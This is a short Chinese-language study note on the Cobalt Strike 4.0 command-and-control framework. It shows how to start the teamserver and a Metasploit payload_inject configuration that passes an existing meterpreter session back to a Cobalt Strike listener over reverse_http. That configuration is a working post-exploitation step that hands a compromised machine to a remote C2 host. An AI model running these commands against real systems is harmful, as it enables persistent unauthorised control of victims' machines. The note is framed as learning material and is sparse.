# CobaltStrike4.0工具学习
` @Time : 2020年11月30日, 0030 11:10`
` @Author  : 862897316@qq.com`
` @Software: PyCharm`

```
开始编写
```
### 安装包内包含服务端以及客户端
```angular2html
服务端需要配置服务器IP以及密码
客户端连接时输入服务器IP以及密码即可
```


### 启动服务端命令`./teamserver IP password`
```angular2html
IP: 客户端与服务端通信的IP地址
password：客户端连接服务端时用到的密码
```
> 示例`./teamserver 192.168.184.144 123456`

## cobalt strike与msf合作
### msf反弹shell到cobalt strike
#### 前置条件
```angular2html
使用msf已经获取到shell，将shell使用background保存至sessions
```
### msf模块配置
```angular2html
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true
set lhost x.x.x.x               #cobaltstrike监听的ip
set lport 6789                 #cobaltstrike监听的端口 
set session 1                   #这里是获得的session的id
exploit
```

### 退出会话
```angular2html
会话需要选中后先退出，再使用remove
```




### 





> 乾坤未定,你我皆是黑马